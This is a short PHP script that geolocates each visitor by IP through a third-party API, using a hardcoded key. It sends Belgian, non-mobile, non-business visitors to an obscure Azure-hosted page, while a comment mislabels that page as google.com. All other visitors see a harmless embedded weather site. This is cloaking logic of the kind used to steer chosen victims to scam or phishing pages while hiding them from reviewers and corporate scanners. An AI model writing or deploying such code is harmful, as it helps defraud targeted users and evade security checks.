<?php

// Replace 'YOUR_API_KEY' with your actual API key
$apiKey = 'Gy4tktnRCrMmmJc7';

// Get the visitor's IP address
$visitor_ip = $_SERVER['REMOTE_ADDR'];

// Make API request to ipwhois.pro
$url = "http://ipwhois.pro/{$visitor_ip}?key={$apiKey}";
$response = file_get_contents($url);

// Decode JSON response
$ip_info = json_decode($response, true);

// Check if the IP is from BE (Belgium)
$is_be = isset($ip_info['country_code']) && $ip_info['country_code'] == 'BE';

// Check if it's a mobile device
$is_mobile = false;
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $is_mobile = preg_match('/(android|iphone|ipad|ipod|blackberry|iemobile|opera mini)/i', $user_agent);
}

// Check if it's a business IP
$is_business = isset($ip_info['org']) && stripos($ip_info['org'], 'business') !== false;

// Perform redirection or iframe embedding based on conditions
if ($is_be && !$is_mobile && !$is_business) {
    // Redirect to pop (google.com)
    header("Location: https://oilnoib.z11.web.core.windows.net/index739e.html?bcda=02-880-26-12");
    exit;
} else {
    // Open clean (ventusky.com) in an iframe
    echo '<iframe src="https://www.ventusky.com/" style="border: none; width: 100%; height: 100vh;"></iframe>';
    exit;
}
?>